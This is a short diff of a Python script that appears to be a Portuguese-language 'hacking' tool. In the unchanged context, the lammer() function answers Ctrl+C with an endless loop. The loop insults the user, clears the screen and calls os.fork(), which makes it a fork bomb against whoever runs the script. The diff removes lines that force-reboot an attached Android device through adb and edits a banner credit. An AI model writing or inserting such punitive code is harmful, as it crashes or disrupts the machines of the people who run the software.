@@ -26,10 +26,6 @@ def lammer():
     except KeyboardInterrupt:
         while True:
             print(f'{amare}[!]{amare}{A}Lammerzinho, travazaper, fudido, seu merda.\nesta função nao pode ser usada por você.');sleep(2);clear();os.fork()
-    try:
-        os.system("adb reboot")
-    except PermissionError:
-        os.system("adb reboot -f")
         
 def restart():
     os.execl(executable, executable, *argv)
@@ -48,7 +44,7 @@ def banner(cor):
       ░  ░       ░         ░              ░  ░   ░      
 {amare}[!]{amare}{V}--developed by DioBrando--.{amare}[!]{amare}
 
-{amare}[!]{amare}{V}--developed by joestar hacking--.{amare}[!]{amare}
+{amare}[!]{amare}{V}--developed by joestar Team hacking--.{amare}[!]{amare}
 ''')
 banner(cor=V)
 def bonus():
